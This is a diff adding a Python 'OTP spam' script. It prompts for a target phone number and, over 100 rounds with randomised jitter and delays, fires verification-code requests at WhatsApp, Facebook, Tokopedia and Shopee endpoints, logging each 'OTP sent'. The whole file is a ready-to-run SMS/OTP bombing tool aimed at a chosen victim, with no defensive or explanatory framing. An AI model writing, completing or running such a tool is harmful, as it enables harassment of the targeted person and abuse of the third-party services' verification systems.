@@ -1,0 +1,47 @@
+import requests
+import time
+import random
+
+# ---------- CONFIG ----------
+target_number = input("Target number: ")   # Change this
+total_spam = 100                  # Total requests
+delay_seconds = 2                 # Delay between requests
+# ----------------------------
+
+# Endpoints (publicly abused OTP endpoints)
+endpoints = {
+    "whatsapp": "https://wa.me/send?phone={}&text=verify",
+    "facebook": "https://www.facebook.com/login/identify/?ctx=recover&phone={}",
+    "tokopedia": "https://accounts.tokopedia.com/login/request-otp?phone={}",
+    "shopee": "https://shopee.co.id/api/v1/account/otp/send?mobile={}"
+}
+
+def send_verification(service, phone):
+    try:
+        if service == "whatsapp":
+            requests.get(endpoints["whatsapp"].format(phone))
+        elif service == "facebook":
+            requests.post("https://www.facebook.com/ajax/otp/send.php",
+                          data={"phone": phone, "type": "sms"})
+        elif service == "tokopedia":
+            requests.post(endpoints["tokopedia"].format(phone),
+                          json={"phone": phone})
+        elif service == "shopee":
+            requests.post(endpoints["shopee"].format(phone),
+                          json={"mobile": phone})
+        print(f"[✓] {service} OTP sent to {phone}")
+    except:
+        print(f"[✗] {service} failed for {phone}")
+
+services = ["whatsapp", "facebook", "tokopedia", "shopee"]
+
+print(f"Starting spam on {target_number} | Total: {total_spam} | Delay: {delay_seconds}s\n")
+
+for i in range(total_spam):
+    for service in services:
+        send_verification(service, target_number)
+        time.sleep(random.uniform(0.5, 1.5))  # small jitter
+    print(f"--- Round {i+1}/{total_spam} done ---")
+    time.sleep(delay_seconds)
+
+print("Spam finished.")
